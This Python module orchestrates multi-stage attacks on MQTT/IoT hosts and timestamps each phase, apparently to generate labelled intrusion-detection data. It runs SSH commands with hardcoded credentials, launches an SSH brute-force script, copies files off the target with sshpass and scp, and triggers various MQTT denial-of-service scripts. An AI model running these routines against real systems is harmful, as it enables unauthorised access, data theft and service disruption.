import random

import pytz
import subprocess
import ssh_auto_access as ssh
import time
from datetime import datetime
import os


def initial_access(hostname, phase_number, command_list, attack_name, step_name, iteration, inf_conclusion_pause=0,
                   sup_conclusion_pause=20,
                   pause_commands=False, inf_interval_pause=0,
                   sup_interval_pause=10):
    a_conclusion_pause = random.randint(inf_conclusion_pause, sup_conclusion_pause)
    start_time = datetime.now(tz=pytz.UTC)
    if pause_commands:
        for command in command_list:
            ssh.ssh_commands(hostname, "ope", "maint", [command], 1, 5, "./out.log")
            a_interval_pause = random.randint(inf_interval_pause, sup_interval_pause)
            time.sleep(a_interval_pause)
    else:
        ssh.ssh_commands(hostname, "ope", "maint", command_list, 1, 5, "./out.log")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {"phase_number": phase_number,
                  "attack_name": attack_name,
                  "phase_name": "reconnaissance",
                  "start_time": start_time,
                  "end_time": end_time,
                  "command": step_name,
                  "iteration": iteration}

    time.sleep(a_conclusion_pause)
    return experiment


def mqtt_discovery(hostname, phase_number, command_list, attack_name, step_name, iteration, inf_conclusion_pause=0,
                   sup_conclusion_pause=1,
                   pause_commands=False, inf_interval_pause=0, sup_interval_pause=3, start_pausing=-1, interval=0):
    start_time = datetime.now(tz=pytz.UTC)
    a_conclusion_pause = random.randint(inf_conclusion_pause, sup_conclusion_pause)
    if pause_commands or start_pausing >= len(command_list):
        if start_pausing >= 0:
            ssh.ssh_commands(hostname, "ope", "maint", command_list[0:start_pausing], 1, 5, "./out.log")
            time.sleep(interval)
        for command in command_list[start_pausing + 1:]:
            ssh.ssh_commands(hostname, "ope", "maint", [command], 1, 5, "./out.log")
            a_interval_pause = random.randint(inf_interval_pause, sup_interval_pause)
            time.sleep(a_interval_pause)
    else:
        ssh.ssh_commands(hostname, "ope", "maint", command_list, 1, 5, "./out.log")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": attack_name,
        "phase_name": "mqtt_discovery",
        "start_time": start_time,
        "end_time": end_time,
        "command": step_name,
        "iteration": iteration
    }
    time.sleep(a_conclusion_pause)
    return experiment


def exfiltrate_scp(hostname, filename, username, password, phase_number, attack_name, pause, iteration):
    start_time = datetime.now(tz=pytz.UTC)
    completed_process = subprocess.run(
        f'sshpass -p "{password}" scp -r {username}@{hostname}:/{filename} ./exfiltrated_data', shell=True,
        capture_output=True, text=True, timeout=60)
    if completed_process.returncode == 0:
        print("Data exfiltration successful:")
        with open("./exfiltrated_data") as f:
            for line in f:
                print(line)
    else:
        print("Data exfiltration failed:")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": attack_name,
        "phase_name": "exfiltration",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "scp_exfiltration"
    }
    time.sleep(random.randint(0, pause))

    return experiment


def brute_force(phase_number, attack_name, iteration, is_distributed=False, action_type='m'):
    start_time = datetime.now(tz=pytz.UTC)
    if is_distributed:
        command_line_input = '--distributed'
    else:
        command_line_input = '--no-distributed'
    command_line_input += ' -a ' + action_type

    os.system('python3 ssh_brute_force.py ' + command_line_input)
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": attack_name,
        "phase_name": "gain_access",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "ssh_brute_force"
    }

    return experiment


def zero_len(hostname, phase_number, pause, iteration):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 zero_len_attack.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "zero_len",
        "phase_name": "dos",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "zero_len"
    }
    time.sleep(random.randint(0, pause))

    return experiment


def qos_mid_dos(hostname, phase_number, pause, iteration):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "sudo python3 qos_mid_dos.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "qos_mid_dos",
        "phase_name": "dos",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "qos_mid_dos"
    }
    time.sleep(pause)

    return experiment


def dollar_char(hostname, phase_number, duration, iteration):
    start_time = datetime.now(tz=pytz.UTC)
    elapsed_time = 0
    while elapsed_time < duration:
        commands = "python3 dollar_char_attack.py"
        commands_list = commands.split(';')
        ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log")
        elapsed_time = (datetime.utcnow() - start_time).total_seconds()

    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "dollar_char",
        "phase_name": "dos",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "dollar_char"
    }

    return experiment


def empty_connection_dos(hostname, phase_number, pause, iteration):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 empty_connection_dos.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "empty_connection_dos",
        "phase_name": "dos",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "empty_connection_dos"
    }
    time.sleep(random.randint(0, pause))

    return experiment


def empty_connection_ddos(hostname_list, phase_number, pause, iteration):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 empty_connection_dos.py"
    commands_list = commands.split(';')
    if hostname_list:
        for hostname in hostname_list:
            ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "empty_connection_ddos",
        "phase_name": "dos",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "empty_connection_ddos"
    }
    time.sleep(0.5)

    return experiment


def slash_char(hostname, phase_number, pause, iteration):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 slash_char_attack.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "slash_char",
        "phase_name": "dos",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "slash_char"

    }
    time.sleep(random.randint(0, pause))

    return experiment


def user_property_dos(hostname, phase_number, pause, iteration):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 user_property_attack.py"
    commands_list = commands.split(';')
    ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "user_property_dos",
        "phase_name": "dos",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "user_property_dos"
    }
    time.sleep(random.randint(0, pause))

    return experiment


def user_property_ddos(hostname_list, phase_number, pause, iteration):
    start_time = datetime.now(tz=pytz.UTC)
    commands = "python3 user_property_attack.py"
    commands_list = commands.split(';')
    if hostname_list:
        for hostname in hostname_list:
            ssh.ssh_commands(hostname, "ope", "maint", commands_list, 1, 5, "./out.log")
    end_time = datetime.now(tz=pytz.UTC)
    experiment = {
        "phase_number": phase_number,
        "attack_name": "user_property_ddos",
        "phase_name": "dos",
        "start_time": start_time,
        "end_time": end_time,
        "iteration": iteration,
        "command": "user_property_ddos"
    }
    time.sleep(random.randint(0, pause))

    return experiment


def reset_envs():
    os.putenv("empty_connection_ddos_num_it", str(0))
    os.putenv("empty_connection_dos_num_it", str(0))
    os.putenv("dollar_char_num_it", str(0))
    os.putenv("slash_char_num_it", str(0))
    os.putenv("zero_len_num_it", str(0))
    os.putenv("sub_exfiltration_num_it", str(0))
    os.putenv("pub_exfiltration_num_it", str(0))
    os.putenv("qos_mid_dos_num_it", str(0))
    os.putenv("empty_connection_ddos_num_it", str(0))
    os.putenv("user_property_dos_num_it", str(0))
    os.putenv("user_property_ddos_num_it", str(0))
